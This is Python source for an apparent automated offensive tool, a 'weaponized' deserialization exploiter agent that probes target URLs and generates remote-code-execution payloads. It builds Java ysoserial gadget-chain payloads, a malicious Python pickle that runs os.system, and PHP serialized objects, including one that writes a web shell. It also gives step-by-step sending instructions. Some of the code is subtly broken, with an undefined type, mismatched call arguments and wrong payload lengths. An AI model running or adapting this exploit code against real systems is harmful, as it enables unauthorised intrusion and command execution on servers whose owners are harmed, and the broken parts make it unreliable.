import asyncio
import base64
import hashlib
import os
import subprocess
from typing import Dict, List, Any, Optional
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class DeserializationExploiter(BaseAgent):
    """
    Weaponized Deserialization Exploiter - โจมตี Insecure Deserialization ได้จริง
    
    Features:
    - Java deserialization (ysoserial integration)
    - Python pickle exploitation
    - PHP unserialize exploitation
    - .NET deserialization
    - Multiple gadget chains
    - Automatic RCE payload generation
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "deserialization")
        self.ysoserial_path = self._find_ysoserial()
        os.makedirs(self.results_dir, exist_ok=True)

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute deserialization exploiter"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _find_ysoserial(self) -> Optional[str]:
        """หา ysoserial jar file"""
        possible_paths = [
            "/usr/share/ysoserial/ysoserial.jar",
            "/opt/ysoserial/ysoserial.jar",
            os.getenv("YSOSERIAL_PATH", "/usr/share/ysoserial/ysoserial.jar"),
            "./ysoserial.jar"
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "exploit_java", "exploit_python", "exploit_php"
            context: {
                "url": target URL,
                "type": "java", "python", "php", "dotnet",
                "command": command to execute,
                "attacker_ip": for reverse shell,
                "port": for reverse shell
            }
        """
        log.info(f"[DeserializationExploiter] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="DeserializationExploiter",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_for_deserialization(url, context)
            elif directive == "exploit_java":
                result = await self._exploit_java_deserialization(url, context)
            elif directive == "exploit_python":
                result = await self._exploit_python_pickle(url, context)
            elif directive == "exploit_php":
                result = await self._exploit_php_unserialize(url, context)
            else:
                result = await self._scan_for_deserialization(url, context)
            
            return AgentData(
                agent_name="DeserializationExploiter",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[DeserializationExploiter] Error: {e}")
            return AgentData(
                agent_name="DeserializationExploiter",
                success=False,
                data={"error": str(e)}
            )

    async def _scan_for_deserialization(self, url: str, context: Dict) -> Dict:
        """สแกนหา deserialization vulnerabilities"""
        log.info(f"[DeserializationExploiter] Scanning {url} for deserialization...")
        
        vulnerabilities = []
        
        # Check for Java serialization
        java_result = await self._check_java_serialization(url, context)
        if java_result["vulnerable"]:
            vulnerabilities.append(java_result)
        
        # Check for Python pickle
        python_result = await self._check_python_pickle(url, context)
        if python_result["vulnerable"]:
            vulnerabilities.append(python_result)
        
        # Check for PHP unserialize
        php_result = await self._check_php_unserialize(url, context)
        if php_result["vulnerable"]:
            vulnerabilities.append(php_result)
        
        result = {
            "success": len(vulnerabilities) > 0,
            "url": url,
            "vulnerabilities": vulnerabilities,
            "output_file": self._save_results(url, "scan", vulnerabilities)
        }
        
        if vulnerabilities:
            log.success(f"[DeserializationExploiter] Found {len(vulnerabilities)} vulnerabilities!")
        else:
            log.warning("[DeserializationExploiter] No vulnerabilities found")
        
        return result

    async def _check_java_serialization(self, url: str, context: Dict) -> Dict:
        """ตรวจสอบ Java serialization"""
        try:
            import aiohttp
            
            # Java serialized object magic bytes: AC ED 00 05
            test_payload = base64.b64encode(b'\xac\xed\x00\x05').decode()
            
            headers = {
                "Content-Type": "application/x-java-serialized-object",
                "User-Agent": "Mozilla/5.0"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=test_payload, headers=headers, timeout=10) as response:
                    # Check for Java deserialization errors
                    text = await response.text()
                    
                    error_patterns = [
                        "java.io.InvalidClassException",
                        "java.io.StreamCorruptedException",
                        "java.io.OptionalDataException",
                        "ClassNotFoundException",
                        "serialization"
                    ]
                    
                    vulnerable = any(pattern in text for pattern in error_patterns)
                    
                    return {
                        "type": "java",
                        "vulnerable": vulnerable,
                        "evidence": text[:500] if vulnerable else None
                    }
        except Exception as e:
            log.debug(f"[DeserializationExploiter] Java check error: {e}")
            return {"type": "java", "vulnerable": False}

    async def _check_python_pickle(self, url: str, context: Dict) -> Dict:
        """ตรวจสอบ Python pickle"""
        try:
            import aiohttp
            import pickle
            
            # Create a test pickle payload
            test_obj = {"test": "data"}
            test_payload = base64.b64encode(pickle.dumps(test_obj)).decode()
            
            headers = {
                "Content-Type": "application/octet-stream",
                "User-Agent": "Mozilla/5.0"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=test_payload, headers=headers, timeout=10) as response:
                    text = await response.text()
                    
                    error_patterns = [
                        "pickle",
                        "UnpicklingError",
                        "_pickle",
                        "cPickle"
                    ]
                    
                    vulnerable = any(pattern in text for pattern in error_patterns)
                    
                    return {
                        "type": "python_pickle",
                        "vulnerable": vulnerable,
                        "evidence": text[:500] if vulnerable else None
                    }
        except Exception as e:
            log.debug(f"[DeserializationExploiter] Python check error: {e}")
            return {"type": "python_pickle", "vulnerable": False}

    async def _check_php_unserialize(self, url: str, context: Dict) -> Dict:
        """ตรวจสอบ PHP unserialize"""
        try:
            import aiohttp
            
            # PHP serialized object
            test_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
            
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data={"data": test_payload}, headers=headers, timeout=10) as response:
                    text = await response.text()
                    
                    error_patterns = [
                        "unserialize",
                        "Notice: unserialize",
                        "Warning: unserialize",
                        "__wakeup",
                        "__destruct"
                    ]
                    
                    vulnerable = any(pattern in text for pattern in error_patterns)
                    
                    return {
                        "type": "php_unserialize",
                        "vulnerable": vulnerable,
                        "evidence": text[:500] if vulnerable else None
                    }
        except Exception as e:
            log.debug(f"[DeserializationExploiter] PHP check error: {e}")
            return {"type": "php_unserialize", "vulnerable": False}

    async def _exploit_java_deserialization(self, url: str, context: Dict) -> Dict:
        """Exploit Java deserialization ด้วย ysoserial"""
        log.info(f"[DeserializationExploiter] Exploiting Java deserialization...")
        
        if not self.ysoserial_path:
            return {
                "success": False,
                "message": "ysoserial not found. Download from: https://github.com/frohoff/ysoserial"
            }
        
        command = context.get("command", "whoami")
        
        # ysoserial gadget chains
        gadgets = [
            "CommonsCollections1",
            "CommonsCollections2",
            "CommonsCollections3",
            "CommonsCollections4",
            "CommonsCollections5",
            "CommonsCollections6",
            "CommonsCollections7",
            "Spring1",
            "Spring2",
            "ROME",
            "JRMPClient",
            "JSON1",
            "Hibernate1",
            "Hibernate2"
        ]
        
        payloads = {}
        
        for gadget in gadgets:
            try:
                # Generate payload with ysoserial
                cmd = [
                    "java", "-jar", self.ysoserial_path,
                    gadget, command
                ]
                
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await proc.communicate()
                
                if proc.returncode == 0:
                    payload_b64 = base64.b64encode(stdout).decode()
                    payloads[gadget] = payload_b64
                    log.success(f"[DeserializationExploiter] Generated {gadget} payload")
                
            except Exception as e:
                log.debug(f"[DeserializationExploiter] Error generating {gadget}: {e}")
        
        result = {
            "success": len(payloads) > 0,
            "command": command,
            "payloads": payloads,
            "instructions": [
                "1. Send one of these payloads to the vulnerable endpoint",
                "2. Use Content-Type: application/x-java-serialized-object",
                "3. Base64 decode the payload before sending",
                "4. Check for command execution"
            ],
            "output_file": self._save_results(url, "java_exploit", payloads)
        }
        
        log.success(f"[DeserializationExploiter] Generated {len(payloads)} Java payloads!")
        return result

    async def _exploit_python_pickle(self, url: str, context: Dict) -> Dict:
        """Exploit Python pickle deserialization"""
        log.info(f"[DeserializationExploiter] Exploiting Python pickle...")
        
        command = context.get("command", "whoami")
        
        # Create malicious pickle payload
        payload_code = f"""
import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('{command}',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
"""
        
        try:
            # Execute payload generation
            proc = await asyncio.create_subprocess_exec(
                "python3", "-c", payload_code,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await proc.communicate()
            payload_b64 = stdout.decode().strip()
            
            result = {
                "success": True,
                "command": command,
                "payload": payload_b64,
                "instructions": [
                    "1. Send this payload to the vulnerable endpoint",
                    "2. The payload will execute the command when unpickled",
                    "3. Check for command output or side effects"
                ],
                "output_file": self._save_results(url, "python_exploit", {"payload": payload_b64})
            }
            
            log.success(f"[DeserializationExploiter] Generated Python pickle payload!")
            return result
            
        except Exception as e:
            log.error(f"[DeserializationExploiter] Error generating pickle payload: {e}")
            return {"success": False, "error": str(e)}

    async def _exploit_php_unserialize(self, url: str, context: Dict) -> Dict:
        """Exploit PHP unserialize"""
        log.info(f"[DeserializationExploiter] Exploiting PHP unserialize...")
        
        command = context.get("command", "system('whoami');")
        
        # PHP POP chain payloads
        payloads = {
            "basic_rce": f'O:8:"stdClass":1:{{s:4:"exec";s:{len(command)}:"{command}";}}',
            
            "file_write": 'O:9:"FileClass":2:{s:8:"filename";s:10:"shell.php";s:4:"data";s:18:"<?php system($_GET[\'cmd\']); ?>";}',
            
            "phar_deserialization": 'phar://test.phar/test.txt',
        }
        
        result = {
            "success": True,
            "command": command,
            "payloads": payloads,
            "instructions": [
                "1. Send one of these payloads to the vulnerable endpoint",
                "2. The payload will be unserialized and execute code",
                "3. Check for command output or file creation"
            ],
            "output_file": self._save_results(url, "php_exploit", payloads)
        }
        
        log.success(f"[DeserializationExploiter] Generated PHP payloads!")
        return result

    def _save_results(self, url: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        filename = f"deser_{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            import json
            with open(filepath, 'w') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[DeserializationExploiter] Failed to save results: {e}")
            return ""

